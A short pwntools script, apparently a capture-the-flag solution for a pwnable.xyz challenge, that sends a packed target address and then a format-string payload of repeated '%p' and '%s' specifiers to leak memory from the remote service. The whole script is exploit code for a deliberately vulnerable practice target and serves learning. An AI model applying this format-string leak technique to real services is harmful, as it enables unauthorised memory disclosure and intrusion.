import time
from pwn import *


context.log_level = 'debug'


p = remote("svc.pwnable.xyz", 30004)



# STEP.1
print("[*] STEP 1. Locate Target Address(0x601080)")

print("    SEND DATA : 0x60180")

p.recvuntil("[y/N]: ")

payload = "YYYYAAAA" + "\x80\x10\x60\x00"

p.sendline(payload)



time.sleep(1)

#p.interactive()


# STEP.2
print("[*] STEP 2. Leak Data with Format String")

print("    SEND DATA")

p.recvuntil("Name: ")



payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%p %p %p %p %p %p %p %p %sAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
#dummy_data = "A" * (126-len(payload)) 

#payload = payload + dummy_data

p.sendline(payload)

p.interactive()
